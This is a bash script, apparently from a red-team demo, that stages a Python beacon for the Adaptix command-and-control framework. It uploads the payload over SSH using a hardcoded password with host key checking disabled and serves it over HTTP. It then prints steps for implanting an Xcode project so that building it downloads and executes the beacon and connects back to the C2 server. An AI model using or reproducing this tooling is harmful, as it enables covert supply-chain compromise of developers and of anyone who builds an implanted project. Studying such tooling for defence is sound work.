#!/bin/bash
#
# Deploy Adaptix macOS Beacon to C2 Server
# This script:
# 1. Uploads the Python beacon to the Adaptix C2 server
# 2. Starts an HTTP server to serve the beacon for download
#

set -e

# Configuration
ADAPTIX_HOST="192.168.36.226"
ADAPTIX_USER="localuser"
ADAPTIX_PASS="password"
ADAPTIX_PORT=8080
BEACON_PORT=9999

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
DEMO_DIR="$(dirname "$SCRIPT_DIR")"
BEACON_FILE="$DEMO_DIR/payloads/adaptix_payload_compact.py"

echo "=========================================="
echo "  Adaptix macOS Beacon Deployment"
echo "=========================================="
echo "C2 Server: $ADAPTIX_HOST"
echo "HTTP Port: $BEACON_PORT"
echo ""

# Check if beacon file exists
if [ ! -f "$BEACON_FILE" ]; then
    echo "[!] Beacon file not found: $BEACON_FILE"
    exit 1
fi

echo "[*] Uploading beacon to Adaptix server..."
sshpass -p "$ADAPTIX_PASS" scp -o StrictHostKeyChecking=no \
    "$BEACON_FILE" \
    "$ADAPTIX_USER@$ADAPTIX_HOST:/tmp/beacon.py"

echo "[*] Setting up HTTP server to serve beacon..."
sshpass -p "$ADAPTIX_PASS" ssh -o StrictHostKeyChecking=no \
    "$ADAPTIX_USER@$ADAPTIX_HOST" \
    "pkill -f 'python3 -m http.server $BEACON_PORT' 2>/dev/null || true; \
     cd /tmp && nohup python3 -m http.server $BEACON_PORT > /dev/null 2>&1 & \
     sleep 1 && curl -s http://localhost:$BEACON_PORT/beacon.py -o /dev/null && echo '[+] HTTP server ready'"

echo ""
echo "=========================================="
echo "  Deployment Complete!"
echo "=========================================="
echo ""
echo "Beacon URL:    http://$ADAPTIX_HOST:$BEACON_PORT/beacon.py"
echo "Adaptix C2:    http://$ADAPTIX_HOST:$ADAPTIX_PORT/api/update"
echo ""
echo "Now implant an Xcode project:"
echo ""
echo "  python3 $DEMO_DIR/xcode_implant/implant_xcode_project.py \\"
echo "      --project /path/to/Project.xcodeproj \\"
echo "      --c2 http://$ADAPTIX_HOST:$BEACON_PORT \\"
echo "      --verbose"
echo ""
echo "When the project is built, the beacon will:"
echo "  1. Download from http://$ADAPTIX_HOST:$BEACON_PORT/beacon.py"
echo "  2. Execute and connect to Adaptix C2 at $ADAPTIX_HOST:$ADAPTIX_PORT"
echo "  3. Check Adaptix GUI for incoming agent"
echo ""
